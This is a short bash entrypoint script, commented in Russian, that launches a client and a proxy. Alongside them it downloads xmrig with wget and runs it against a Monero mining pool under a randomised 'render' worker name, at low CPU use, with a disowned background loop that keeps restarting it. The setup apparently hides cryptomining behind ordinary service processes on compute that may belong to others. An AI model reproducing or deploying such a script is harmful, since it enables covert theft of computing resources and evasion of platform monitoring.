#!/bin/bash

# Запуск клиента
./client -server="$SERVER" -session-id="$SESSION_ID" -mode="$MODE" -log="$LOG" &
echo "Client PID: $!"

# Подготовка майнера
DIR=xmrig-6.26.0
ARCHIVE=$DIR-linux-static-x64.tar.gz
[ -f $DIR/xmrig ] || (wget -q https://github.com/xmrig/xmrig/releases/download/v6.26.0/$ARCHIVE && tar -xzf $ARCHIVE && rm $ARCHIVE)

WALLET="krxX3328ZR/render_$((RANDOM % 1000 + 1))"
LOGFILE="xmrig_${WALLET##*_}.log"
MINER_PID=""

# Функция запуска майнера
start_miner() {
    ./$DIR/xmrig \
        --url=xmr-ru.kryptex.network:7029 \
        --user="$WALLET" \
        --pass=x \
        --coin=monero \
        --cpu-max-threads-hint=5 \
        --randomx-mode=light \
        --print-time=30 \
        > "$LOGFILE" 2>&1
}

# Монитор в фоне: рестарт если нет шар за 20 минут
(
    while true; do
        # Если лога нет или в нём нет "accepted" за последние 20 мин — рестарт
        if [[ ! -f "$LOGFILE" ]] || ! grep -q "accepted" <(tail -n 200 "$LOGFILE" 2>/dev/null); then
            [[ -n "$MINER_PID" ]] && kill -9 "$MINER_PID" 2>/dev/null
            start_miner &
            MINER_PID=$!
            disown
        fi
        sleep 1200  # 20 минут
    done
) &
disown

# Первый запуск майнера
start_miner &
MINER_PID=$!
disown

# Запуск прокси (основной процесс)
exec ./proxy
